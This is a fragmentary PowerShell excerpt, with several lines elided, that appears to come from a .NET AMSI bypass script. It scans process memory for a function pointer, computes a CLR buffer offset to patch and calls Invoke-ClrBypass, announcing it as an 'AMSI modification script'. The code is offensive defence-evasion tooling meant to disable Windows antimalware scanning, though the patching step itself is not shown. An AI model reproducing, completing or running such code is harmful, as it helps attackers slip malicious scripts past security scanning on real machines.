...
:initialloop for($j = $InitialStart; $j -lt $MaxOffset; $j += $NegativeOffset){
    ...
    for ($i = 0; $i -lt $ReadedMemoryArray.Length; $i += 1) {
     ...
     if ($PointerToCompare -eq $funcAddr) {
         Write-Host ("Found @ 0x{0:X} : 0x{1:X}!" -f $j, $i)
...
[Int64] $Address = $Address
[Int64] $clrBufferOffset = $clrBufferOffset
# [IntPtr] $MemoryToPatch = $Address + $clrBufferOffset
...
Write-Host "Starting .NET AMSI modification script..." -ForegroundColor Cyan
Invoke-ClrBypass
Write-Host ".NET AMSI modification script completed." -ForegroundColor Green